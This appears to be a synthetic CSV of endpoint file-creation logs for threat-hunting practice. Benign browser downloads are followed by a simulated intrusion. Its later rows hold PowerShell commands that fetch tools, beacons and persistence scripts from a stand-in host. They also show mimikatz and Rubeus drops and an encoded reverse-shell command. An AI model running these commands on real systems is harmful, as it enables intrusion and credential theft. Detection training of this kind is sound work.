TimeGenerated,Timestamp,DeviceName,ActionType,FileName,FolderPath,SHA256,SHA1,MD5,FileSize,InitiatingProcessFileName,InitiatingProcessAccountName,InitiatingProcessCommandLine,Type
2026-04-29T00:40:39Z,2026-04-29T00:40:39Z,SVR-WEB-01,FileCreated,notes.txt,C:\Users\dchen\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,3752983,chrome.exe,dchen,chrome.exe,DeviceFileEvents
2026-04-29T01:52:18Z,2026-04-29T01:52:18Z,WS-HR-03,FileCreated,expenses.pdf,C:\Users\mholmes\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,2452631,chrome.exe,mholmes,chrome.exe,DeviceFileEvents
2026-04-29T02:15:39Z,2026-04-29T02:15:39Z,WS-DEV-02,FileCreated,expenses.pdf,C:\Users\dchen\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,4381632,chrome.exe,dchen,chrome.exe,DeviceFileEvents
2026-04-29T04:10:00Z,2026-04-29T04:10:00Z,WS-DEV-02,FileCreated,report.docx,C:\Users\bryce\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,4854201,chrome.exe,bryce,chrome.exe,DeviceFileEvents
2026-04-29T05:05:56Z,2026-04-29T05:05:56Z,SVR-WEB-01,FileCreated,expenses.pdf,C:\Users\jadams\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,2746803,chrome.exe,jadams,chrome.exe,DeviceFileEvents
2026-04-29T07:08:33Z,2026-04-29T07:08:33Z,SVR-WEB-01,FileCreated,screenshot.png,C:\Users\dchen\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,350577,chrome.exe,dchen,chrome.exe,DeviceFileEvents
2026-04-29T07:09:08Z,2026-04-29T07:09:08Z,SVR-WEB-01,FileCreated,report.docx,C:\Users\jadams\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,1976783,chrome.exe,jadams,chrome.exe,DeviceFileEvents
2026-04-29T07:25:53Z,2026-04-29T07:25:53Z,SVR-DC-01,FileCreated,expenses.pdf,C:\Users\bryce\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,2111546,chrome.exe,bryce,chrome.exe,DeviceFileEvents
2026-04-29T08:57:39Z,2026-04-29T08:57:39Z,SVR-DC-01,FileCreated,screenshot.png,C:\Users\mholmes\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,4819328,chrome.exe,mholmes,chrome.exe,DeviceFileEvents
2026-04-29T09:24:09Z,2026-04-29T09:24:09Z,SVR-DC-01,FileCreated,report.docx,C:\Users\bryce\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,4554316,chrome.exe,bryce,chrome.exe,DeviceFileEvents
2026-04-29T09:54:42Z,2026-04-29T09:54:42Z,WS-DEV-02,FileCreated,screenshot.png,C:\Users\mholmes\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,752624,chrome.exe,mholmes,chrome.exe,DeviceFileEvents
2026-04-29T10:35:40Z,2026-04-29T10:35:40Z,WS-FINANCE-01,FileCreated,expenses.pdf,C:\Users\jadams\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,1726807,chrome.exe,jadams,chrome.exe,DeviceFileEvents
2026-04-29T11:00:56Z,2026-04-29T11:00:56Z,WS-HR-03,FileCreated,notes.txt,C:\Users\bryce\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,1537231,chrome.exe,bryce,chrome.exe,DeviceFileEvents
2026-04-29T11:55:16Z,2026-04-29T11:55:16Z,WS-DEV-02,FileCreated,report.docx,C:\Users\jadams\Downloads,0000000000000000000000000000000000000000000000000000000000000000,0000000000000000000000000000000000000000,00000000000000000000000000000000,1226357,chrome.exe,jadams,chrome.exe,DeviceFileEvents
2026-04-29T13:09:40Z,2026-04-29T13:09:40Z,WS-MKT-02,FileCreated,creds.txt,C:\Users\rmorales\AppData\Local\Temp\.dump,03a247bd5cf87bfed6cd19009467893b44ccd944efe28e9e0df9814ba5f4ae05,62a255979271ee5588a4641776ef7b12f4ae5dd5,23f0ad5d417d0e010845f275758ce42e,12345,powershell.exe,rmorales,"powershell.exe -nop -c ""Invoke-WebRequest http://203.0.113.150/creds.txt -OutFile C:\Users\rmorales\AppData\Local\Temp\.dump\\creds.txt""",DeviceFileEvents
2026-04-29T13:16:40Z,2026-04-29T13:16:40Z,WS-IT-02,FileCreated,tunnel.exe,C:\Users\sthompson\AppData\Local\Temp\.tools,bb35e360c96602cc106dc69ab05600bcd27c7a29101ce123b1fa08d922de2729,a8f967d203b0cd5bcbf01f87a8e79a2454f56c97,6f75d01844217fcaf9686ec7484799ef,12345,powershell.exe,sthompson,"powershell.exe -nop -c ""Invoke-WebRequest http://203.0.113.150/tunnel.exe -OutFile C:\Users\sthompson\AppData\Local\Temp\.tools\\tunnel.exe""",DeviceFileEvents
2026-04-29T13:23:40Z,2026-04-29T13:23:40Z,WS-OPS-02,FileCreated,collect.zip,C:\Users\mwhite\Documents\exfil,9a891714926ebad3330e3c2bb882e4159c47237a7493f21c898d4cf07d798ba0,28698477daab0b5b303e523e837cbf2b1f169894,c36a8c220698c7744f3e99736fa0e6dc,12345,powershell.exe,mwhite,"powershell.exe -nop -c ""Invoke-WebRequest http://203.0.113.150/collect.zip -OutFile C:\Users\mwhite\Documents\exfil\\collect.zip""",DeviceFileEvents
2026-04-29T13:25:00Z,2026-04-29T13:25:00Z,WS-FINANCE-01,FileCreated,credhelper.dll,C:\Windows\Temp,8888888888888888888888888888888888888888888888888888888888888888,0000000000000000000000000000000000000000,00000000000000000000000000000000,4318865,rundll32.exe,SYSTEM,"rundll32.exe credhelper.dll,Reflect",DeviceFileEvents
2026-04-29T13:30:40Z,2026-04-29T13:30:40Z,LAP-EXEC-01,FileCreated,persistence.bat,C:\Users\olopez\AppData\Local\Temp\boot,d23c94aa104a6a6d344b1aeb1b1769068ba58009308eb25f6111683dd0a3a452,ce0ffec09512ff2342a7114b30791b108ce39d0f,82a3271506a0daed444c26d30a2e838a,12345,powershell.exe,olopez,"powershell.exe -nop -c ""Invoke-WebRequest http://203.0.113.150/persistence.bat -OutFile C:\Users\olopez\AppData\Local\Temp\boot\\persistence.bat""",DeviceFileEvents
2026-04-29T13:31:00Z,2026-04-29T13:31:00Z,WS-DEV-02,FileCreated,mimikatz.exe,C:\Users\dchen\AppData\Local\Temp,ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,0000000000000000000000000000000000000000,00000000000000000000000000000000,1401480,powershell.exe,dchen,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,DeviceFileEvents
2026-04-29T13:31:00Z,2026-04-29T13:31:00Z,WS-DEV-02,FileCreated,rubeus.exe,C:\Users\dchen\AppData\Local\Temp,9999999999999999999999999999999999999999999999999999999999999999,0000000000000000000000000000000000000000,00000000000000000000000000000000,1005103,powershell.exe,dchen,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,DeviceFileEvents
2026-04-29T13:37:40Z,2026-04-29T13:37:40Z,WS-MKT-01,FileCreated,beacon.dll,C:\Users\kpatel\AppData\Roaming\.cache,11349318f0a9db8674dc4950f268b660865035796fa91560d1c2602d5ec5d4a6,dc8ab259ce19c08ed070257d27640cec9b24c197,74db68664dfa3a17a895d357755d2b0f,12345,powershell.exe,kpatel,"powershell.exe -nop -c ""Invoke-WebRequest http://203.0.113.150/beacon.dll -OutFile C:\Users\kpatel\AppData\Roaming\.cache\\beacon.dll""",DeviceFileEvents
2026-04-29T13:44:40Z,2026-04-29T13:44:40Z,WS-IT-01,FileCreated,agent.ps1,C:\Users\jharris\AppData\Local\Temp\stage-001,1c648424e2063aed03a87ebd6fd2e6017798a04888b5ea198eeafef9fbb5a847,7271335644ed5c74a2d5745041b5e36f0d41b481,4d0c2fdd366a99c2a4a757e0066a9f7d,12345,powershell.exe,jharris,"powershell.exe -nop -c ""Invoke-WebRequest http://203.0.113.150/agent.ps1 -OutFile C:\Users\jharris\AppData\Local\Temp\stage-001\\agent.ps1""",DeviceFileEvents
